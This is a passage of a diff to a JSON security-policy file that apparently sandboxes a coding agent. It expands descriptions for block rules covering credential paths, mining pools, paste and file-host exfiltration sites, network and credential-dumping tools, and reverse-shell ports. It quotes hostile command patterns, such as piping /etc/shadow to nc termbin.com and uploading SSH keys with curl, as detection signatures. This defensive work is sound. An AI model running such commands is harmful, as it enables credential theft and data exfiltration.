@@ -53,7 +53,6 @@
   },
   "blocked_ips": {
     "IP-001": "51.222.161.168",
-    "IP-002": "178.128.242.134",
     "IP-003": "94.130.12.30",
     "IP-004": "104.22.10.63",
     "IP-005": "144.76.217.73"
@@ -99,13 +98,13 @@
     "linux": {
       "LIN-001": {
         "rule": "block_reverse_shell_4444",
-        "match": "connect",
+        "match": "*4444*",
         "port": 4444,
         "action": "SIGKILL"
       },
       "LIN-002": {
         "rule": "block_reverse_shell_1337",
-        "match": "connect",
+        "match": "*1337*",
         "port": 1337,
         "action": "SIGKILL"
       },
@@ -370,603 +369,599 @@
   },
   "rule_metadata": {
     "PATH-MAC-001": {
-      "description": "SSH private keys and authorized_keys; enables credential theft and lateral movement",
+      "description": "Blocks access to the SSH directory containing private keys (id_rsa, id_ed25519, etc.) and authorized_keys. An attacker or compromised agent could use these credentials to authenticate as the user on remote servers, pivot laterally across infrastructure, or establish persistent backdoors. SSH keys are the primary mechanism for passwordless access to servers and cloud instances.",
       "severity": "critical"
     },
     "PATH-MAC-002": {
-      "description": "GPG keys and passphrase store; enables signing/decrypt impersonation",
+      "description": "Blocks access to the GPG directory containing private keys and the passphrase store. GPG keys are used for signing commits, decrypting secrets, and verifying software integrity. A compromised agent could impersonate the user's cryptographic identity, decrypt sensitive files, or sign malicious code as if it came from the victim.",
       "severity": "critical"
     },
     "PATH-MAC-003": {
-      "description": "AWS credentials; enables cloud account takeover and resource abuse",
+      "description": "Blocks access to AWS credentials stored in the home directory. These files typically contain access keys and secret keys that grant full control over AWS accounts. A malicious actor could use them to spin up cryptocurrency miners, exfiltrate data from S3, assume roles across the organization, or incur massive cloud bills.",
       "severity": "critical"
     },
     "PATH-MAC-004": {
-      "description": "Azure credentials; enables cloud account takeover",
+      "description": "Blocks access to Azure credentials and configuration. Azure credentials provide access to subscriptions, resource groups, and services. Compromised credentials can lead to data exfiltration from storage accounts, deployment of malicious resources, or lateral movement across hybrid cloud environments.",
       "severity": "critical"
     },
     "PATH-MAC-005": {
-      "description": "GCP credentials; enables cloud account takeover",
+      "description": "Blocks access to Google Cloud Platform credentials and configuration. GCP credentials enable access to Compute Engine, GKE, Cloud Storage, and other services. Stolen credentials can result in resource abuse, data theft, or unauthorized access to production workloads.",
       "severity": "critical"
     },
     "PATH-MAC-006": {
-      "description": "Kubernetes kubeconfig; enables cluster takeover and lateral movement",
+      "description": "Blocks access to the Kubernetes kubeconfig file, which contains cluster credentials and API server endpoints. With this file, an attacker can gain full administrative access to Kubernetes clusters, deploy malicious workloads, exfiltrate secrets from the cluster, or pivot to other cloud resources linked to the cluster identity.",
       "severity": "critical"
     },
     "PATH-MAC-007": {
-      "description": "macOS Keychain; contains stored passwords, certs, and secrets",
+      "description": "Blocks access to the macOS Keychain, which stores passwords, certificates, secure notes, and cryptographic keys used by applications. The Keychain is the central secret store for the system and many apps. Access allows extraction of saved passwords, WiFi credentials, and application secrets.",
       "severity": "critical"
     },
     "PATH-MAC-008": {
-      "description": "System password database; enables credential dumping",
+      "description": "Blocks access to the system password database (master.passwd on macOS). This file contains password hashes and account metadata. While modern systems use strong hashing, offline cracking or credential stuffing with these hashes can compromise user accounts and enable privilege escalation.",
       "severity": "critical"
     },
     "PATH-MAC-009": {
-      "description": "Browser cookies; enables session hijacking and account takeover",
+      "description": "Blocks access to browser cookie stores. Cookies often contain session tokens that allow authentication without a password. Session hijacking via stolen cookies can grant persistent access to web applications, email, and cloud services even after password changes.",
       "severity": "high"
     },
     "PATH-MAC-010": {
-      "description": "Chrome login data; contains saved passwords and autofill",
+      "description": "Blocks access to Chrome's Login Data database, which stores saved passwords and autofill data in encrypted form. Although encrypted, the decryption key is typically available to user-space processes, enabling extraction of all saved passwords for websites and applications.",
       "severity": "critical"
     },
     "PATH-MAC-011": {
-      "description": "Chrome cookies; enables session hijacking",
+      "description": "Blocks access to Chrome cookie files. Cookies contain session identifiers and tokens. Stolen cookies enable session hijacking, allowing an attacker to access the user's logged-in sessions without knowing the password.",
       "severity": "high"
     },
     "PATH-MAC-012": {
-      "description": "Firefox profiles; contains saved passwords and cookies",
+      "description": "Blocks access to Firefox profile directories, which contain saved passwords (in logins.json), cookies, and browsing history. Firefox stores credentials that can be decrypted using keys available to the user, enabling full credential extraction.",
       "severity": "critical"
     },
     "PATH-MAC-013": {
-      "description": "Arc browser login data; contains saved passwords",
+      "description": "Blocks access to Arc browser login data. Arc is a Chromium-based browser, and its Login Data stores saved passwords similarly to Chrome. Compromised access allows extraction of all stored credentials.",
       "severity": "critical"
     },
     "PATH-MAC-014": {
-      "description": "iMessage database; private communications and attachments",
+      "description": "Blocks access to the iMessage database containing private messages, attachments, and conversation history. This is highly sensitive personal and potentially business communications that could be used for blackmail, corporate espionage, or identity theft.",
       "severity": "high"
     },
     "PATH-MAC-015": {
-      "description": "Mail database; private emails and attachments",
+      "description": "Blocks access to the Mail application database containing emails, attachments, and account credentials. Email accounts are often the key to password resets for other services; access enables account takeover across many platforms.",
       "severity": "high"
     },
     "PATH-MAC-016": {
-      "description": "Account credentials; system account store",
+      "description": "Blocks access to the system Accounts store, which holds credentials and tokens for iCloud, email, and other integrated services. Compromise allows access to synced data, Find My Mac, and linked services.",
       "severity": "high"
     },
     "PATH-MAC-017": {
-      "description": "Calendar data; private scheduling information",
+      "description": "Blocks access to calendar data containing appointments, meeting details, and potentially sensitive scheduling information. While lower risk than credentials, this data can reveal organizational structure, travel patterns, and confidential meetings.",
       "severity": "medium"
     },
     "PATH-MAC-018": {
-      "description": "Suggestion data; may contain sensitive context",
+      "description": "Blocks access to Siri and system suggestion data, which may contain contextual information from user activity. Risk is lower but can include sensitive context that could inform social engineering or targeted attacks.",
       "severity": "low"
     },
     "PATH-MAC-019": {
-      "description": "Network configuration; enables MITM and DNS hijacking",
+      "description": "Blocks access to network configuration files that define DNS, proxy, and network settings. Modifying these can enable man-in-the-middle attacks, DNS hijacking, or redirecting traffic through attacker-controlled proxies to intercept credentials and data.",
       "severity": "high"
     },
     "PATH-LIN-001": {
-      "description": "Root SSH keys; enables privilege escalation and lateral movement",
+      "description": "Blocks access to root's SSH directory. Root SSH keys grant unrestricted access to the system. Compromise enables full server takeover, persistence, and lateral movement to other systems that trust the root key. Root access is the highest privilege on Linux.",
       "severity": "critical"
     },
     "PATH-LIN-002": {
-      "description": "Shadow password hashes; enables offline cracking and credential dump",
+      "description": "Blocks access to the shadow file containing password hashes. While readable only by root, a compromised root process could extract hashes for offline cracking. Shadow hashes are the primary target for credential dumping attacks aimed at privilege escalation.",
       "severity": "critical"
     },
     "PATH-LIN-004": {
-      "description": "Sudoers config; enables privilege escalation",
+      "description": "Blocks access to the main sudoers file that defines who can run commands as root. Modification allows adding backdoors, granting sudo to attacker-controlled accounts, or disabling password requirements for privilege escalation.",
       "severity": "critical"
     },
     "PATH-LIN-005": {
-      "description": "Sudoers.d drop-in dir; enables privilege escalation",
+      "description": "Blocks access to the sudoers.d directory containing drop-in sudo configuration. Same risks as the main sudoers file; attackers often add files here to avoid modifying the primary config and evade detection.",
       "severity": "critical"
     },
     "PATH-LIN-006": {
-      "description": "User SSH keys; enables credential theft and lateral movement",
+      "description": "Blocks access to user SSH directories across home directories. SSH keys enable passwordless authentication; stolen keys allow lateral movement, persistence, and access to any system or service that trusts those keys, including Git, rsync, and deployment targets.",
       "severity": "critical"
     },
     "PATH-LIN-007": {
-      "description": "User GPG keys; enables signing/decrypt impersonation",
+      "description": "Blocks access to user GPG directories. GPG keys sign commits, decrypt files, and verify packages. Stolen keys enable cryptographic impersonation, decryption of sensitive assets, and signing malicious code with the victim's identity.",
       "severity": "critical"
     },
     "PATH-LIN-008": {
-      "description": "User AWS credentials; enables cloud account takeover",
+      "description": "Blocks access to user AWS credential files. These contain access keys for AWS accounts. Compromise enables full cloud account takeover, resource abuse, data exfiltration from S3, and lateral movement via IAM roles.",
       "severity": "critical"
     },
     "PATH-LIN-009": {
-      "description": "User Azure credentials; enables cloud account takeover",
+      "description": "Blocks access to user Azure credentials. Azure credentials grant access to subscriptions and resources. Stolen credentials enable data theft, malicious resource deployment, and lateral movement across Azure and hybrid environments.",
       "severity": "critical"
     },
     "PATH-LIN-010": {
-      "description": "User GCP credentials; enables cloud account takeover",
+      "description": "Blocks access to user GCP credentials. GCP credentials provide access to projects, Compute Engine, GKE, and storage. Compromise enables resource abuse, data exfiltration, and unauthorized access to production workloads.",
       "severity": "critical"
     },
     "PATH-LIN-011": {
-      "description": "User kubeconfig; enables Kubernetes cluster takeover",
+      "description": "Blocks access to user kubeconfig files. Kubernetes configs contain cluster credentials and API endpoints. With access, an attacker can control clusters, exfiltrate secrets, deploy malicious workloads, or pivot to cloud provider credentials linked to the cluster.",
       "severity": "critical"
     },
     "PATH-LIN-012": {
-      "description": "Docker socket; enables container escape and host takeover",
+      "description": "Blocks access to the Docker socket, which provides full control over the Docker daemon. Docker socket access is equivalent to root on the host: attackers can mount the host filesystem, escape containers, run privileged containers, or compromise the entire system.",
       "severity": "critical"
     },
     "DOM-001": {
-      "description": "Monero mining pool; cryptojacking and resource theft",
+      "description": "Known Monero (XMR) mining pool domain. Cryptojacking malware connects to mining pools to mine cryptocurrency using victim compute resources. Blocking prevents compromised agents from contributing to attacker wallets and reduces CPU/resource theft that degrades system performance.",
       "severity": "high"
     },
     "DOM-002": {
-      "description": "Monero mining pool; cryptojacking",
+      "description": "Known Monero mining pool. Cryptominers are a common payload for compromised development environments; blocking pool connectivity prevents resource theft and limits attacker revenue from unauthorized mining.",
       "severity": "high"
     },
     "DOM-003": {
-      "description": "Monero mining pool; cryptojacking",
+      "description": "Known Monero mining pool. Mining pool domains are frequently used by cryptojacking malware. Blocking ensures that even if a miner binary executes, it cannot connect to the pool to receive work or submit shares.",
       "severity": "high"
     },
     "DOM-004": {
-      "description": "Monero mining pool; cryptojacking",
+      "description": "Known Monero mining pool. Crypto mining pools are the destination for stolen compute cycles. Blocking pool connectivity is a key defense against cryptojacking campaigns that target CI/CD and developer workstations.",
       "severity": "high"
     },
     "DOM-005": {
-      "description": "Monero mining pool; cryptojacking",
+      "description": "Known Monero mining pool. Same rationale as other pool blocks; defense in depth across multiple pool domains ensures coverage as attackers rotate infrastructure.",
       "severity": "high"
     },
     "DOM-006": {
-      "description": "Crypto mining pool; cryptojacking",
+      "description": "Known multi-currency mining pool. Supports various cryptocurrencies; blocking prevents cryptojacking regardless of which coin the malware is configured to mine.",
       "severity": "high"
     },
     "DOM-007": {
-      "description": "Multi-coin mining pool; cryptojacking",
+      "description": "Known multi-coin mining pool. Cryptojacking campaigns often use multi-pool services. Blocking prevents both Monero and other coin mining from compromised systems.",
       "severity": "high"
     },
     "DOM-008": {
-      "description": "Monero mining pool; cryptojacking",
+      "description": "Known Monero mining pool. Part of the mining pool blocklist to prevent cryptojacking. Mining malware typically requires pool connectivity to function; blocking breaks the attack chain.",
       "severity": "high"
     },
     "DOM-009": {
-      "description": "Monero mining pool; cryptojacking",
+      "description": "Known Monero mining pool. HashVault and similar pools are common targets for blocklists. Blocking limits the operational options for cryptojacking malware.",
       "severity": "high"
     },
     "DOM-010": {
-      "description": "Monero mining pool; cryptojacking",
+      "description": "Known Monero mining pool (C3Pool). C3Pool is a large mining pool; blocking prevents one of the most common cryptojacking destinations.",
       "severity": "high"
     },
     "DOM-011": {
-      "description": "Bitcoin/Ethereum mining pool; cryptojacking",
+      "description": "Known Bitcoin and Ethereum mining pool. F2Pool is a major multi-coin pool. Blocking prevents cryptojacking for both proof-of-work cryptocurrencies.",
       "severity": "high"
     },
     "DOM-012": {
-      "description": "Bitcoin mining pool; cryptojacking",
+      "description": "Known Bitcoin mining pool. Antpool is one of the largest Bitcoin pools. Blocking prevents Bitcoin-focused cryptojacking in addition to Monero-focused attacks.",
       "severity": "high"
     },
     "DOM-013": {
-      "description": "Ethereum mining pool; cryptojacking",
+      "description": "Known Ethereum mining pool. Ethermine is a major Ethereum pool. Blocking prevents GPU-based Ethereum mining from compromised workstations and servers.",
       "severity": "high"
     },
     "DOM-014": {
-      "description": "Bitcoin mining pool; cryptojacking",
+      "description": "Known Bitcoin mining pool. Slush Pool is a long-standing mining pool. Blocking adds coverage for Bitcoin cryptojacking campaigns.",
       "severity": "high"
     },
     "DOM-015": {
-      "description": "Multi-coin mining pool; cryptojacking",
+      "description": "Known multi-coin mining pool. Poolin supports multiple cryptocurrencies. Blocking prevents a broad range of mining malware from operating.",
       "severity": "high"
     },
     "DOM-016": {
-      "description": "Paste site; common exfiltration and C2 dead-drop",
+      "description": "Pastebin is a popular paste site frequently abused for data exfiltration and C2 dead-drop. Attackers paste stolen credentials, configs, or receive commands via pastes. Blocking prevents this common exfiltration and C2 channel.",
       "severity": "high"
     },
     "DOM-017": {
-      "description": "Terminal paste; exfiltration and payload delivery",
+      "description": "Termbin provides terminal-based paste functionality. Commonly used to exfiltrate command output (e.g., cat /etc/shadow | nc termbin.com) or deliver payloads. Blocking prevents this lightweight exfiltration method.",
       "severity": "high"
     },
     "DOM-018": {
-      "description": "File transfer service; exfiltration endpoint",
+      "description": "Transfer.sh is a file hosting service. Attackers use it to exfiltrate files or host payloads. Blocking prevents file exfiltration and malicious file retrieval through this service.",
       "severity": "high"
     },
     "DOM-019": {
-      "description": "Ephemeral file host; exfiltration and payload delivery",
+      "description": "File.io provides ephemeral file hosting. Used for quick exfiltration of sensitive files or payload delivery. Blocking limits this exfiltration vector.",
       "severity": "high"
     },
     "DOM-020": {
-      "description": "File host; exfiltration endpoint",
+      "description": "0x0.st is a minimal file host. Frequently used in scripts and automation for exfiltration or payload delivery. Blocking prevents abuse of this lightweight hosting service.",
       "severity": "high"
     },
     "IP-001": {
-      "description": "Known Monero mining pool IP",
-      "severity": "high"
-    },
-    "IP-002": {
-      "description": "Known Monero mining pool IP",
+      "description": "IP address associated with Monero mining pool infrastructure (supportxmr.com). Blocking at the IP level provides defense when domain resolution is bypassed or when malware uses hardcoded IPs.",
       "severity": "high"
     },
     "IP-003": {
-      "description": "Known cryptojacking C2 IP",
+      "description": "Known cryptojacking or C2 infrastructure IP. Blocking prevents connectivity to attacker infrastructure even when domains are not used or are resolved through alternate DNS.",
       "severity": "high"
     },
     "IP-004": {
-      "description": "Known paste exfil proxy IP",
+      "description": "IP associated with paste/exfiltration services (e.g., Pastebin via Cloudflare). Blocking prevents exfiltration when domain blocking might be bypassed.",
       "severity": "high"
     },
     "IP-005": {
-      "description": "Known file exfil host IP",
+      "description": "IP associated with file hosting services used for exfiltration (e.g., 0x0.st). IP-level blocking provides additional coverage for file exfiltration prevention.",
       "severity": "high"
     },
     "BIN-001": {
-      "description": "Netcat; reverse shells, bind shells, and data exfiltration",
+      "description": "Netcat (nc) is a network utility that can create reverse shells, bind shells, and exfiltrate data. It is the most common tool for establishing interactive remote access after exploitation. There is no legitimate coding-agent use case that requires nc; blocking prevents the primary post-exploitation tool.",
       "severity": "critical"
     },
     "BIN-002": {
-      "description": "Ncat; Nmap netcat variant, reverse shells and lateral movement",
+      "description": "Ncat is the netcat implementation from the Nmap project. It supports SSL, proxies, and scripting. Like nc, it is primarily used for reverse shells, data exfiltration, and lateral movement. Blocking prevents this enhanced netcat variant from being used in attacks.",
       "severity": "critical"
     },
     "BIN-003": {
-      "description": "Socat; bidirectional relay, reverse shells, and port forwarding",
+      "description": "Socat is a bidirectional data relay. It can create reverse shells, forward ports, and pipe data between network and file descriptors. It is more powerful than netcat and is commonly used in advanced exploitation. No legitimate agent use case justifies its availability.",
       "severity": "critical"
     },
     "BIN-004": {
-      "description": "Nmap; network reconnaissance and port scanning",
+      "description": "Nmap is a network reconnaissance and port scanning tool. While useful for legitimate security testing, a coding agent has no need to scan networks. Scanning can map internal infrastructure for lateral movement or identify vulnerable services. Blocking prevents reconnaissance that precedes exploitation.",
       "severity": "medium"
     },
     "BIN-005": {
-      "description": "Masscan; high-speed port scanner for recon",
+      "description": "Masscan is an extremely fast port scanner. It can scan the entire internet in minutes. Like nmap, it is used for reconnaissance. A coding agent does not need to discover network services; blocking prevents large-scale scanning that could precede attacks.",
       "severity": "medium"
     },
     "BIN-006": {
-      "description": "ARP scan; local network reconnaissance",
+      "description": "arp-scan discovers hosts on the local network via ARP. Used for network reconnaissance and mapping. Coding agents do not need to enumerate local hosts; blocking prevents reconnaissance that supports lateral movement.",
       "severity": "medium"
     },
     "BIN-007": {
-      "description": "XMRig; Monero cryptominer",
+      "description": "XMRig is the most common Monero CPU miner. It is the primary binary used in cryptojacking campaigns. There is no legitimate reason for a coding agent to run a cryptocurrency miner; blocking prevents the most prevalent cryptojacking payload.",
       "severity": "high"
     },
     "BIN-008": {
-      "description": "Minerd; Bitcoin CPU miner",
+      "description": "Minerd is a Bitcoin CPU miner. Cryptojacking malware often uses CPU miners for Monero or Bitcoin. Blocking prevents Bitcoin-focused cryptojacking in development environments.",
       "severity": "high"
     },
     "BIN-009": {
-      "description": "CGMiner; GPU cryptominer",
+      "description": "CGMiner is a GPU-based cryptocurrency miner supporting multiple algorithms. GPU miners are used when attackers have access to workstations with graphics cards. Blocking prevents GPU cryptojacking.",
       "severity": "high"
     },
     "BIN-010": {
-      "description": "CPUMiner; CPU cryptominer",
+      "description": "CPUMiner is a generic CPU cryptocurrency miner. Used in cryptojacking campaigns targeting servers and workstations. Blocking prevents CPU-based cryptojacking regardless of target coin.",
       "severity": "high"
     },
     "BIN-011": {
-      "description": "Ethminer; Ethereum GPU miner",
+      "description": "Ethminer is an Ethereum GPU miner. Ethereum mining was common before the merge; blocking prevents legacy Ethereum cryptojacking and similar GPU mining attacks.",
       "severity": "high"
     },
     "BIN-012": {
-      "description": "XMR-Stak; multi-algo cryptominer",
+      "description": "XMR-Stak is a multi-algorithm cryptominer supporting CPU and GPU. It can mine Monero and other coins. Blocking prevents this flexible miner from being used in cryptojacking.",
       "severity": "high"
     },
     "BIN-013": {
-      "description": "HellMiner; cryptominer",
+      "description": "HellMiner is a Monero miner. Part of the cryptominer blocklist. Blocking ensures comprehensive coverage against Monero-focused cryptojacking.",
       "severity": "high"
     },
     "BIN-014": {
-      "description": "NanoMiner; cryptominer",
+      "description": "NanoMiner is a multi-algorithm cryptominer. Used in cryptojacking campaigns. Blocking prevents this miner variant from operating in compromised environments.",
       "severity": "high"
     },
     "BIN-015": {
-      "description": "PhoenixMiner; Ethereum miner",
+      "description": "PhoenixMiner is an Ethereum/ETH Classic miner. Blocking prevents Ethereum-family cryptojacking from GPU-equipped systems.",
       "severity": "high"
     },
     "BIN-016": {
-      "description": "TeamRedMiner; AMD GPU miner",
+      "description": "TeamRedMiner targets AMD GPUs for cryptocurrency mining. Blocking prevents AMD GPU cryptojacking in workstations and servers with AMD graphics.",
       "severity": "high"
     },
     "BIN-017": {
-      "description": "LolMiner; multi-GPU miner",
+      "description": "LolMiner is a multi-GPU miner supporting various algorithms. Blocking prevents GPU cryptojacking across NVIDIA and AMD hardware.",
       "severity": "high"
     },
     "BIN-018": {
-      "description": "T-Rex; NVIDIA miner",
+      "description": "T-Rex is a popular NVIDIA GPU miner. Blocking prevents NVIDIA GPU cryptojacking, which is common on developer workstations and cloud GPU instances.",
       "severity": "high"
     },
     "BIN-019": {
-      "description": "NBMiner; multi-algo miner",
+      "description": "NBMiner supports multiple algorithms and dual mining. Blocking prevents this flexible miner from being used in cryptojacking campaigns.",
       "severity": "high"
     },
     "BIN-020": {
-      "description": "GMiner; GPU miner",
+      "description": "GMiner is a GPU cryptominer. Blocking prevents GPU-based cryptojacking. Coding agents have no legitimate use for mining software.",
       "severity": "high"
     },
     "BIN-021": {
-      "description": "SRBMiner; CPU/GPU miner",
+      "description": "SRBMiner supports CPU and GPU mining. Blocking adds coverage against cryptojacking. Comprehensive miner blocklists prevent attackers from switching to alternate binaries.",
       "severity": "high"
     },
     "BIN-022": {
-      "description": "Mimikatz; Windows credential dumping (Wine/cross-platform)",
+      "description": "Mimikatz is a Windows credential dumping tool that extracts passwords, hashes, and tickets from memory. It can run under Wine on Linux/macOS. There is no legitimate coding use; it is exclusively an offensive security tool. Blocking prevents credential theft even in cross-platform environments.",
       "severity": "critical"
     },
     "BIN-023": {
-      "description": "Secretsdump; Impacket tool for credential extraction",
+      "description": "Secretsdump is part of the Impacket suite and extracts credentials from Windows systems (SAM, LSA, NTDS). It is used for credential dumping and lateral movement. Coding agents do not need to extract Windows credentials; blocking prevents credential theft.",
       "severity": "critical"
     },
     "BIN-024": {
-      "description": "GDB; process memory inspection and code injection",
+      "description": "GDB is the GNU debugger. It can attach to processes, inspect memory, and inject code. While useful for development, a coding agent should not attach to arbitrary processes or modify running binaries. Blocking prevents memory inspection and code injection attacks.",
       "severity": "high"
     },
     "BIN-025": {
-      "description": "Strace; syscall tracing, can capture secrets and inject",
+      "description": "Strace traces system calls. It can capture secrets passed through syscalls (e.g., read of /etc/shadow) and is sometimes used to prepare injection. Blocking prevents syscall-level reconnaissance and injection preparation.",
       "severity": "high"
     },
     "BIN-026": {
-      "description": "Ltrace; library call tracing",
+      "description": "Ltrace traces library calls. Similar to strace but for shared libraries. Can capture sensitive data and support reverse engineering. Blocking prevents library-level inspection that could aid exploitation.",
       "severity": "high"
     },
     "BIN-027": {
-      "description": "Ptrace; process tracing and injection",
+      "description": "Ptrace is the ptrace utility for process tracing. The ptrace syscall enables debugging, memory inspection, and code injection. Blocking prevents low-level process manipulation that could be used to inject malicious code or extract secrets.",
       "severity": "high"
     },
     "MAC-001": {
-      "description": "Reverse-shell port 4444; common C2 callback",
+      "description": "Blocks outbound TCP connections to port 4444. Port 4444 is the default Metasploit reverse shell callback port and is commonly used by C2 frameworks. A compromised agent could use nc or similar to connect back to an attacker; blocking prevents this callback.",
       "severity": "critical"
     },
     "MAC-002": {
-      "description": "Reverse-shell port 1337; common C2 callback",
+      "description": "Blocks outbound TCP connections to port 1337. Port 1337 (leet) is a popular alternative C2 callback port. Blocking prevents reverse shells and callback beacons that use this well-known port.",
       "severity": "critical"
     },
     "MAC-003": {
-      "description": "Reverse-shell port 5555; Android ADB / C2",
+      "description": "Blocks outbound TCP connections to port 5555. Port 5555 is used by Android ADB and is also a common C2 callback port. Blocking prevents both ADB-based attacks and generic reverse shell callbacks.",
       "severity": "critical"
     },
     "MAC-004": {
-      "description": "Reverse-shell port 9001; common C2 callback",
+      "description": "Blocks outbound TCP connections to port 9001. Port 9001 is frequently used as a C2 callback port in penetration testing tools and malware. Blocking prevents reverse shell callbacks on this port.",
       "severity": "critical"
     },
     "MAC-005": {
-      "description": "Reverse-shell port 31337; elite / backdoor",
+      "description": "Blocks outbound TCP connections to port 31337 (elite in leetspeak). This port is associated with backdoors and elite/underground tools. Blocking prevents callback traffic to this traditional backdoor port.",
       "severity": "critical"
     },
     "MAC-006": {
-      "description": "AppleScript; GUI automation, keystroke injection, app control",
+      "description": "Blocks execution of osascript (AppleScript). AppleScript can control GUI applications, inject keystrokes, and automate user interactions. A compromised agent could use it to steal data from open apps, inject credentials, or perform actions as the user. No legitimate coding task requires GUI automation via AppleScript.",
       "severity": "critical"
     },
     "MAC-007": {
-      "description": "Security CLI; Keychain dump and cert extraction",
+      "description": "Blocks execution of the security CLI. This tool can dump Keychain contents, extract certificates, and access stored passwords. It is the primary way to extract macOS secrets from the command line. Blocking prevents credential extraction.",
       "severity": "critical"
     },
     "MAC-008": {
-      "description": "dscl; create/modify/delete users and groups",
+      "description": "Blocks execution of dscl (Directory Service command line). dscl can create, modify, and delete users and groups. A compromised agent could add backdoor accounts or escalate privileges. Blocking prevents user/group manipulation.",
       "severity": "critical"
     },
     "MAC-009": {
-      "description": "dseditgroup; group membership changes",
+      "description": "Blocks execution of dseditgroup. This tool modifies group membership, including admin groups. Used for privilege escalation by adding the attacker to the admin group. Blocking prevents group-based privilege escalation.",
       "severity": "high"
     },
     "MAC-010": {
-      "description": "networksetup; network config and proxy changes",
+      "description": "Blocks execution of networksetup. This tool modifies network configuration, proxies, and DNS. Could be used to redirect traffic through attacker-controlled proxies for credential interception. Blocking prevents network configuration changes.",
       "severity": "high"
     },
     "MAC-011": {
-      "description": "profiles; MDM profile install/remove",
+      "description": "Blocks execution of the profiles command. Profiles can install and remove MDM and configuration profiles. Malicious profiles could grant device control. Blocking prevents profile-based persistence and policy bypass.",
       "severity": "high"
     },
     "MAC-012": {
-      "description": "systemsetup; system settings changes",
+      "description": "Blocks execution of systemsetup. This tool changes system-wide settings. Could be used to disable security features or modify boot behavior. Blocking prevents system configuration changes.",
       "severity": "high"
     },
     "MAC-013": {
-      "description": "spctl; Gatekeeper/SIP policy bypass",
+      "description": "Blocks execution of spctl (Gatekeeper/SIP policy tool). spctl can modify code signing and Gatekeeper policies, potentially allowing unsigned or malicious code to run. Blocking prevents security policy bypass.",
       "severity": "critical"
     },
     "MAC-014": {
-      "description": "screencapture (sbin); screen capture and exfiltration",
+      "description": "Blocks execution of screencapture from /usr/sbin. Screencapture can capture the screen and exfiltrate visual data. A compromised agent could capture sensitive information displayed on screen. Blocking prevents screen exfiltration.",
       "severity": "high"
     },
     "MAC-015": {
-      "description": "screencapture (bin); screen capture and exfiltration",
+      "description": "Blocks execution of screencapture from /usr/bin. Same as MAC-014; screencapture may be in either location. Blocking ensures screen capture is prevented regardless of path.",
       "severity": "high"
     },
     "MAC-016": {
-      "description": "socketfilterfw; firewall control and bypass",
+      "description": "Blocks execution of socketfilterfw (Application Firewall). This tool controls the macOS firewall. A compromised agent could disable the firewall to open attack surface. Blocking prevents firewall manipulation.",
       "severity": "high"
     },
     "MAC-017": {
-      "description": "ARD kickstart; enable remote desktop / VNC",
+      "description": "Blocks execution of ARD kickstart. This enables Apple Remote Desktop and VNC, allowing remote control of the machine. A compromised agent could enable remote access for the attacker. Blocking prevents remote desktop enablement.",
       "severity": "high"
     },
     "MAC-018": {
-      "description": "Network bind; blocks listening sockets (except localhost)",
+      "description": "Blocks network bind to non-localhost addresses. Prevents the agent from opening listening sockets that could accept incoming connections (reverse shells, bind shells, or C2 listeners). Localhost is allowed for the OpenClaw gateway.",
       "severity": "medium"
     },
     "MAC-019": {
-      "description": "Allow localhost bind; OpenClaw gateway requires loopback",
+      "description": "Explicitly allows localhost bind. The OpenClaw gateway requires loopback connectivity for agent communication. This rule ensures the gateway can bind to 127.0.0.1 while MAC-018 blocks external binds.",
       "severity": "info"
     },
     "LIN-001": {
-      "description": "Reverse-shell connect to port 4444",
+      "description": "Blocks TCP connections to port 4444, the default Metasploit reverse shell port. A compromised agent could use bash, nc, or similar to connect back to an attacker. Blocking prevents the most common C2 callback port.",
       "severity": "critical"
     },
     "LIN-002": {
-      "description": "Reverse-shell connect to port 1337",
+      "description": "Blocks TCP connections to port 1337, a popular alternative C2 callback port. Prevents reverse shells and callback beacons that use this well-known port.",
       "severity": "critical"
     },
     "LIN-003": {
-      "description": "Crypto stratum TCP URL; miner pool connection",
+      "description": "Blocks command lines matching stratum+tcp URL patterns used by cryptominers to connect to mining pools. The stratum protocol is how miners receive work; blocking prevents pool connectivity even if a miner binary runs.",
       "severity": "high"
     },
     "LIN-004": {
-      "description": "Crypto stratum TCP -o; miner pool connection",
+      "description": "Blocks command lines with -o stratum+tcp:// miner pool connection flags. Alternative pattern for cryptominer pool configuration. Blocking ensures miners cannot connect regardless of argument order.",
       "severity": "high"
     },
     "LIN-005": {
-      "description": "Crypto stratum SSL URL; miner pool connection",
+      "description": "Blocks stratum+ssl:// URL patterns. Some miners use SSL to connect to pools. Blocking prevents encrypted pool connections that might evade network inspection.",
       "severity": "high"
     },
     "LIN-006": {
-      "description": "Crypto stratum SSL -o; miner pool connection",
+      "description": "Blocks -o stratum+ssl:// miner pool flags. Complementary to LIN-005 for SSL-based mining pool connections.",
       "severity": "high"
     },
     "LIN-007": {
-      "description": "Miner donate-level flag; cryptominer signature",
+      "description": "Blocks the --donate-level= flag, which is specific to XMRig and similar miners. This flag is a strong cryptominer signature with no legitimate use.",
       "severity": "high"
     },
     "LIN-008": {
-      "description": "Miner CPU threads flag; cryptominer signature",
+      "description": "Blocks the --cpu-max-threads-hint flag used by cryptominers to configure CPU usage. Another miner-specific signature.",
       "severity": "high"
     },
     "LIN-009": {
-      "description": "RandomX algo; Monero miner signature",
+      "description": "Blocks --algo=rx/0, the RandomX algorithm used for Monero mining. This is a definitive cryptominer signature.",
       "severity": "high"
     },
     "LIN-010": {
-      "description": "Miner pool -o; cryptominer signature",
+      "description": "Blocks -o pool. miner pool configuration. Miners use -o to specify pool URLs. Blocking prevents pool connectivity.",
       "severity": "high"
     },
     "LIN-011": {
-      "description": "Cat SSH private key; credential theft",
+      "description": "Blocks 'cat ~/.ssh/id_rsa' and similar commands that read SSH private keys. SSH keys are the primary credential for server access; blocking prevents credential theft.",
       "severity": "critical"
     },
     "LIN-012": {
-      "description": "Cat AWS credentials; credential theft",
+      "description": "Blocks 'cat ~/.aws/credentials' and similar commands that read AWS credentials. AWS keys grant cloud access; blocking prevents credential extraction.",
       "severity": "critical"
     },
     "LIN-013": {
-      "description": "Curl upload SSH key; exfiltration",
+      "description": "Blocks 'curl -T ~/.ssh/id_rsa' which uploads the SSH private key to a remote server. This is direct exfiltration of credentials. Blocking prevents key theft.",
       "severity": "critical"
     },
     "LIN-014": {
-      "description": "Tar SSH dir; credential archive for exfil",
+      "description": "Blocks tar commands that archive the .ssh directory. Attackers often tar credentials for exfiltration. Blocking prevents credential archive creation.",
       "severity": "critical"
     },
     "LIN-015": {
-      "description": "Zip AWS dir; credential archive for exfil",
+      "description": "Blocks zip commands that archive the .aws directory. Similar to LIN-014; zipping credentials for exfiltration. Blocking prevents AWS credential theft.",
       "severity": "critical"
     },
     "LIN-016": {
-      "description": "Tar kubeconfig; Kubernetes cred exfil",
